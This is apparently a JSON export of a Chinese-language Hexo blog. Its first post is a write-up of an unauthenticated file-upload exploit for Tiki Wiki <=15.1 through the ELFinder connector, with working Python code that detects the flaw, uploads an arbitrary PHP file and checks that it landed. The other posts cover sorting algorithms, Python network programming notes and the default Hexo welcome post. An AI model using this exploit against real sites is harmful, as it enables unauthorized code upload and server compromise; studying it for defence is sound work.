[{"title":"tiki_wiki（<=15.1）任意文件上传漏洞","date":"2017-04-24T03:29:42.000Z","path":"2017/04/24/Tiki_Wiki_Unauthenticated_File_Upload/","text":"Tiki Wiki &lt;=15.1 - Unauthenticated File Upload漏洞原理利用Tiki利用Tiki Wiki&lt;=15.1中的文件上传漏洞，漏洞来自tiki的第三方组件ELFinder -version 2.0该组件带有一个默认的示例页面：包括上传、删除、重命名、创建目录等并且该页面不强制进行文件扩展名、内容类型等验证。因此，未经身份验证的用户也可以上传PHP文件。 exp编写1. 检测漏洞是否存在使用requests模块，http://docs.python-requests.org/zh_CN/latest/user/quickstart.html1234567891011def check(url, port): parts = ['http://', url, ':', port, '/tiki/vendor_extra/elfinder/elfinder.html'] target_url = ''.join('%s' % part for part in parts) print(target_url) r = requests.get(target_url) if (r.status_code == 200): print(\"检测成功,开始攻击\") return True else: print(\"未检测到\") return False 2. 漏洞利用 选择一个php文件上传然后抓包可得： 据此，使用requests库提交Multipart/form-data格式的数据，查看post部分 据此构造参数 1234files = &#123;'cmd': (None, 'upload'), 'target': (None, 'l1_XA'), 'upload[]': (filename, open(filename, 'rb'), 'application/octet-stream') &#125; 随后使用post方法提交 12345678def exploit(url, port, filename): parts = ['http://', url, ':', port, '/tiki/vendor_extra/elfinder/php/connector.minimal.php'] target_url = ''.join('%s' % part for part in parts) files = &#123;'cmd': (None, 'upload'), 'target': (None, 'l1_XA'), 'upload[]': (filename, open(filename, 'rb'), 'application/octet-stream') &#125; r = requests.post(target_url, files=files) 3.检测是否上传成功如果上传成功，会在/tiki/vendor_extra/elfinder/files/路径下找到上传的文件123456789def check_success(url, port, filename): parts = ['http://', url, ':', port, '/tiki/vendor_extra/elfinder/files/', filename] target_url = ''.join('%s' % part for part in parts) r = requests.get(target_url) if (r.status_code == 200): print(\"上传成功~\") else: print(\"上传失败\")","tags":[{"name":"exploit","slug":"exploit","permalink":"http://yoursite.com/tags/exploit/"},{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"}]},{"title":"基本排序算法的分析与实现","date":"2017-04-22T17:29:42.000Z","path":"2017/04/23/algorithm_sort_1/","text":"前言因为发现自己好像已经很久没有像样的写过算法了……慢慢的重新整理算法吧。写成一个系列算了~（反正也是按照书的顺序简单记笔记） 初级排序算法选择排序算法思想：首先，找到数组中最小的那个元素，然后将它和数组第一个元素交换位置。然后在剩下的元素中找到最小的元素，和第二个元素交换位置。如此往复，因为它总是在不断地选择剩余元素中的最小者，所以是选择排序。 从左向右移动指针 i++ 确定在右边最小项的索引 1234int min=i;for(int j=i+1;j&lt;N;j++) if(less(a[j],a[min])//如果a[j]&lt;a[min] min=j; 交换位置 exch(a,i,min); 代码实现（java） 效率分析对于长度为N的数组，选择排序大约需要N^2/2次比较和N次交换比较次数：首先寻找第一个最小项，除了它本身之外，都做一次比较，所以是N-1次；到最后一个最小项，无需比较，所以是0次，共需：交换次数：每选择一个元素交换一次，共需N次 算法特点 运行时间和输入无关。一个已经有序的数组和一个随机排列的数组所用的排序时间一样长！ 数据的移动是最少的。交换次数和数组的大小是线性关系 插入排序算法思想 从左向右扫描i++ 从左向右移动，交换a[i]和它左边最大的一项。1234for(int j=i;j&gt;0;j--) if(less(a[j],a[j-1]) exch(a[j],a[j-1]); else break; 算法实现 效率分析对于随机排列，长度为N且主键不重复的数组，平均情况下，插入排序需要约N^2/4次比较以及N^2/4次交换，最好情况下需要N-1次比较和0次交换最坏情况下（逆序数组），对角线之下所有元素都要移动位置，最好情况下都不需要。比较的总次数是交换的次数加上N-1 算法特点插入排序对于部分有序的数组来说效率更高。 部分有序： 数组中每个元素距离他的最终位置都不远 一个有序的大数组接一个小数组 数组中只有几个元素位置不对 希尔排序算法思想 选择递增数列（例如1/2(3^k-1)） 对于递增数列中的每个元素h，用插入排序将h个子数组独立的排序 算法实现 算法分析使用递增数列1,4,13,40,121,364……的希尔排序所需的比较次数不会超出N的若干倍乘以递增序列的长度。 归并排序算法思想归并两个排好序的序列：给了两个已经排好序的子序列，将其合并成一个排好序的序列。1.将原数组的所有内容复制到另一个数组中12for(int k=lo;k&lt;hi;k++) aux[k]=a[k];//将a[lo...hi]复制到aux[lo...hi] 2.将其拷贝回原来的数组 设置i,j,k分别指向aux的左边子数组，aux的右边子数组和原数组a的首部int i=lo,j=mid+1; 比较aux[i]和aux[j]的大小，取其中小的放入放入原数组中，原本的指针递增。重复上述过程。 注意四个判断 1.左半边元素用尽，取右半边 2.右半边元素用尽，取左半边 3.右半边当前元素小于左半边当前元素 4.右半边当前元素大于等于左半边当前元素 归并的算法实现 在归并的代码基础上，递归实现排序 在递归调用前先检查下标if(hi&lt;=lo) return; 计算中间值mid，先排序前半部分，再排序后半部分，然后归并。1234int mid=(lo+hi)/2;sort(a,aux,lo,mid);sort(a,aux,mid+1,hi);merge(a,aux,lo,mid,hi); 完整的算法实现 这里要注意，不要将创建辅助数组的任务在递归的sort()中创建，因为那会多出分配许多额外的小数组的花费。这会严重影响归并的效率！ 效率分析归并排序需要至多NlogN次比较和6NlogN次数组访问 比较的次数 归并算法使用随着N的增大而增大的额外空间 自底向上的归并 快速排序 算法思想设置最左边元素索引为lo,最右边为hi，设置i=lo+1，j=hi 从左到右扫描，如果a[i] &lt; a[lo]则i右移 从右向左扫描，如果a[j] &gt; a[lo]则j左移 当a[i]&gt;=a[lo]且a[j]&lt;=a[lo]时，交换a[i]和a[j]的值 不断重复上述过程，直到i和j相遇。 相遇之后，交换a[lo]和a[j]的值，从而使得j左边的元素都比a[j]小，右边的元素都比a[j]大 将原数组分成j左边和j右边两部分，递归上述过程实现排序。 算法实现 效率分析将长度为N的无重复数组排序，快速排序平均需要~2NlnN次比较。 快排算法改进——三向切分主要用于存在大量重复元素的数组 算法思想 将a[lo]作为切分元素 让i从左向右扫描 a[i] &lt; v,将a[lt]和a[i]交换，lt和i右移 a[i] &gt; v,将a[gt]和a[i]交换，gt左移 a[i] = v,将i右移 算法实现","tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://yoursite.com/tags/Algorithm/"}]},{"title":"python网络编程：客户端/服务端网络编程简介","date":"2017-03-24T20:29:42.000Z","path":"2017/03/25/Python_Network_Program_1/","text":"客户端/服务端网络编程1.1 基础：协议栈与库 协议栈（Protocol stack） 复杂的网络服务建立在简单网络服务的基础之上 Python库（library） 包括内置的标准库和第三方库，来解析使用的网络协议 要学习的内容就是了解重要的网络库，并理解这些网络库所出现的底层网络服务。 1.2 一个有趣的例子Question: 找出’ 207 N. Defiance St , Archbold, OH ‘所对应的经度纬度。 1.2.1 最上层的谷歌地理编码API使用第三方库获取经度和纬度 step 0:寻找一个第三方包 python standard library:https://docs.python.org/3/library/ python package index:https://pypi.python.org/pypi step 1:下载安装一个第三方包：pygeocoder step 2:运行 虽然把一个有趣的网络编程问题变成一个三行的无聊脚本很让人不爽，但是90%的编程挑战就是这么解决的——在已有的解决方案的基础上构建智能又简洁的方案。 12345678#!/usr/bin/env python3#search1.pyfrom pygeocoder import Geocoderif __name__ == '__main__': address = '207 N. Defiance St, Archbold, OH' print(Geocoder.geocode(address)[0].coordinates) 1.2.2 应用层从谷歌地理编码API获取一个JSON文档 step 0:如果没有一个完整封装了所需要功能的第三方库，就需要我们自己为谷歌地图API编写客户端 step 1:构造URL，获得查询响应 step 2:将结果转化为JSON request库文档http://docs.python-requests.org/en/master/ 使用requests发送网络请求 123import requests#获取 Github 的公共时间线：r = requests.get('https://github.com/timeline.json') 传递URL参数例如， httpbin.org/get?key=val。使用Requests允许使用params关键字参数，以一个字典来提供查询字符串的参数 1234payload = &#123;'key1': 'value1', 'key2': 'value2'&#125;r = requests.get(\"http://httpbin.org/get\", params=payload)print(r.url)# 输出http://httpbin.org/get?key2=value2&amp;key1=value1 json解码 12345import requestsr = requests.get('https://github.com/timeline.json')r.json()#[&#123;u'repository': &#123;u'open_issues': 0, u'url': 'https://github.com/... 1234567891011121314#!/usr/bin/env python3#search2.pyimport requestsdef geocode(address): parameters = &#123;'address': address, 'sensor': 'false'&#125; base = 'http://maps.googleapis.com/maps/api/geocode/json' response = requests.get(base, params=parameters) answer = response.json() print(answer['results'][0]['geometry']['location'])if __name__ == '__main__': geocode('207 N. Defiance St, Archbold, OH') 什么是URL？http://maps.googleapis.com/maps/api/geocode/json?address=&quot;207 N. Defiance St, Archbold, OH&quot;&amp;sensor=false 协议 主机名 主机上特定文档的路径 这里我们使用的底层协议就是著名的HTTP（Hypertext Transfer Protocol） Requests库的具体原理机制其实就是由HTTP提供的 1.2.3 直接使用http协议 使用原始http操作连接谷歌地图 step 1:请求连接一台特定的主机 step 2:手动构造一个带path的GET查询 step 3:直接从http连接读取响应结果。 http和json class http.client.HTTPConnection(host, port=None, [timeout, ]source_address=None) 与HTTP服务器建立连接 例如，以下调用创建连接到同一主机和端口上的服务器的实例： 12345&gt;&gt;&gt;&gt;&gt;&gt; h1 = http.client.HTTPConnection(&apos;www.python.org&apos;)&gt;&gt;&gt; h2 = http.client.HTTPConnection(&apos;www.python.org:80&apos;)&gt;&gt;&gt; h3 = http.client.HTTPConnection(&apos;www.python.org&apos;, 80)&gt;&gt;&gt; h4 = http.client.HTTPConnection(&apos;www.python.org&apos;, 80, timeout=10) json.loads(s, *, encoding=None, cls=None, object_hook=None, parse_float=None, parse_int=None, parse_constant=None, object_pairs_hook=None, **kw) 按照conversion table将s对象（包含JSON文档的str，bytes或bytearray实例）反序列化为Python对象。 12345678910111213141516171819#!/usr/bin/env python3#search3.pyimport http.clientimport jsonfrom urllib.parse import quote_plusbase = '/maps/api/geocode/json'def geocode(address): path = '&#123;&#125;?address=&#123;&#125;&amp;sensor=false'.format(base, quote_plus(address)) connection = http.client.HTTPConnection('maps.googleapis.com') connection.request('GET', path) rawreply = connection.getresponse().read() reply = json.loads(rawreply.decode('utf-8')) print(reply['results'][0]['geometry']['location'])if __name__ == '__main__': geocode('207 N. Defiance St, Archbold, OH') 1.2.4 更原始的网络会话HTTP是无法通过空气在机器间传输数据的，它使用了更简单的抽象来完成这些操作。 事实上，现代操作系统提供了使用TCP协议在IP网络的不同程序间进行纯文本网络会话的功能。 换句话说，HTTP协议精准描述了两台主机间通过TCP传输的信息格式，并以此提供HTTP的各项功能。 如果深入观察HTTP的实现细节，那么你将到达通过Python可以方便操作的网络协议栈的最底层（撒花） 直接使用套接字与谷歌地图通信 step 1 发送字节串 step 2 接收字节串并打印到屏幕 我们可以通过sendall()函数传入的参数来了解到我们进行查询的具体内容。可以看到GET /maps/api/geocode/json?address={}&amp;sensor=false HTTP/1.1\\r\\n\\查询中包括了关键字GET,后面跟着待获取文档的路径和支持的HTTP版本。此外可以看到，GET信息后跟着一些请求头，每个请求头包括了名称，冒号，值，结束符（回车换行） 这些状态和响应头就是之前程序中被我们用http库处理的底层细节。 1234567891011121314151617181920212223242526272829#!/usr/bin/env python3#search4.pyimport socketfrom urllib.parse import quote_plusrequest_text = \"\"\"\\GET /maps/api/geocode/json?address=&#123;&#125;&amp;sensor=false HTTP/1.1\\r\\n\\Host: maps.googleapis.com:80\\r\\n\\User-Agent: search4.py (Foundations of Python Network Programming)\\r\\n\\Connection: close\\r\\n\\\\r\\n\\\"\"\"def geocode(address): sock = socket.socket() sock.connect(('maps.googleapis.com', 80)) request = request_text.format(quote_plus(address)) sock.sendall(request.encode('ascii')) raw_reply = b'' while True: more = sock.recv(4096) if not more: break raw_reply += more print(raw_reply.decode('utf-8'))if __name__ == '__main__': geocode('207 N. Defiance St, Archbold, OH') 1.2.5 层层深入 可以看到，协议栈的每一层都是使用了底层协议提供的功能，并向上层提供服务。 Python对各网络层的支持十分全面,无论是获取特定URL标识的文档还是使用socket来接收字节串，python都提供了现成的类和函数。 随着通信协议越来越底层，程序的质量明显下降。search2.py和search3.py对查询的表单结构和主机名等进行了硬编码，难以维护。search4.py更是包含了一个手写的、无参数的HTTP请求。这说明正确实现网络协议并非易事，应该尽可能的使用标准库或者第三方库。 高层的网络协议会将底层网络的细节隐藏，如果只用过pygeocoder库，将永远不知道URL和HTTP是它的底层机制。 1.2.6 编码和解码python3做了一项尝试，永远不会自动将字节转换为字符串。因此比起Python2，Python3更多的调用decode()和encode()方法 解码(decode)：在应用程序使用字节时发生，比如从网络或文件接收到字节串。 编码(encode): 将字符串对外输出时所实施的过程。 12345678910111213141516#!/usr/bin/env python3#stringcodes.pyif __name__ == '__main__': # Translating from the outside world of bytes to Unicode characters. input_bytes = b'\\xff\\xfe4\\x001\\x003\\x00 \\x00i\\x00s\\x00 \\x00i\\x00n\\x00.\\x00' input_characters = input_bytes.decode('utf-16') print(repr(input_characters)) # Translating characters back into bytes before sending them. output_characters = 'We copy you down, Eagle.\\n' output_bytes = output_characters.encode('utf-8') print(repr(output_bytes)) # output # '413 is in.' # b'We copy you down, Eagle.\\n' &apos;413 is in.&apos; b&apos;We copy you down, Eagle.\\n&apos; 1.2.7 IP地址一个传统的4字节IP地址如下表示：130.207.244.244由于纯数字不方便记忆，人们使用hostname代替IP，如我们输入google.com就可以访问谷歌，但其实它是将主机名解析成了具体的IP。这个特定的网络服务叫做域名系统（DNS,Domain Name System） 目前只需要记住 实际IP协议总是由数字表示的IP来作为数据包的目的地址 将主机名解析为IP这一复杂的细节是由操作系统来处理的 1234567891011#!/usr/bin/env python3# getname.pyimport socketif __name__ == '__main__': hostname = 'maps.google.com' addr = socket.gethostbyname(hostname) print('The IP address of &#123;&#125; is &#123;&#125;'.format(hostname, addr)) #output #The IP address of maps.google.com is 172.217.24.14 The IP address of maps.google.com is 172.217.24.14 特殊的IP地址段 127.*.*.*：特殊的预留地址段 这一地址段由机器上运行的本地应用程序使用 大多数时候，我们使用127.0.0.1或者localhost表示运行该程序的机器本身。 10.*.*.*、176.16-31.*.*、192.168.*.*：私有子网 1.2.8 路由一旦应用程序请求操作系统向某一特定IP地址发送数据，操作系统就需要决定如何使用该机器来连接物理网络来传输数据。根据目的IP地址选择将数据包发往何处就叫做路由 在网络协议中，IP是面向非连接的，所谓的非连接就是传递数据的时候，不检测网络是否连通。所以是不可靠的数据报协议，IP协议主要负责在主机之间寻址和选择数据包路由。由于python程序很少运行在骨干网路由器上，所以只需记住以下简单路由的情形。 如果IP地址形如127.*.*.*，那么操作系统会知道数据包的目的地址是本机上运行的另一个应用程序。这个数据包甚至不会被传送给物理网络设备，而是通过操作系统内部的数据复制转交给另一应用程序。 如果目的IP地址与本机处于同一子网，就可以通过检查本地以太网段、无线信道，或是其他任何网络信息来找到目标主机。然后就可以将数据包发送给本地连接的机器。 否则，计算机将数据包转发给网关（gateway machine），它将本地子网连接至互联网，然后决定将数据包发往何处。 什么是子网？同一子网中所有主机有着相同的IP地址前缀。实际的路由表中，通过结合IP地址和掩码来表示子网。掩码指出了某主机属于某子网所需的高位比特匹配数。只需要记得IP地址的每字节代表8位二进制数，就能读懂子网的数字表示。 127.0.0.0/8：描述了前面所述预留给本机的IP地址段，即地址的前8位必须与127匹配，后24位是任意值。 192.168.0.0/16：描述了192.168私有地址段的任何IP地址，即地址的前16位必须完全匹配，后16位可以是任意值 192.168.5.0/24：这里明确制定了一个特定的独立子网，是最常见的子网掩码。地址前24位（3字节）都被指定，用来匹配属于该子网的IP地址，只有最后一位不同，这就允许有256个不同的地址。 通常来说，.0地址代表子网名，.255则用作“广播数据包”的目的地址：所以实际上有254个地址分配给计算机。.1地址通常用于连接外网的网关，但不是绝对的。 1.2.9 数据包分组尽管操作系统的网络栈已经巧妙的隐藏了这一复杂的细节，但是这里还是简单的提一下。IP支持的数据包极大，最大可至64KB，但是构建与IP网络之上的实际网络设备通常不支持这么大的数据包，所以需要分片。IP头包含一个表示“不分组”的标记（DF,Don’t Fragment） 没有设置DF,允许分组并标记，接收后重组。 设置了DF标记，不允许分组，如果网络无法容纳数据包，将会丢弃并发挥一条错误信息，错误信息是由一种数据包表示的，叫做ICMP(Internet Control Message Protocal) Python程序无法控制DF标记，通常由操作系统决定，操作系统的逻辑一般是：UDP会话不设置DF标记，TCP会话设置DF标记（保证数据包在途中不会被不断分组，而导致会话低效） 关于IP分片(IP Fragment)的详细内容另外，可以参考tcp/ip卷一11.5","tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"},{"name":"Network","slug":"Network","permalink":"http://yoursite.com/tags/Network/"}]},{"title":"Hello World","date":"2017-03-24T16:36:58.071Z","path":"2017/03/25/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","tags":[{"name":"hello","slug":"hello","permalink":"http://yoursite.com/tags/hello/"}]}]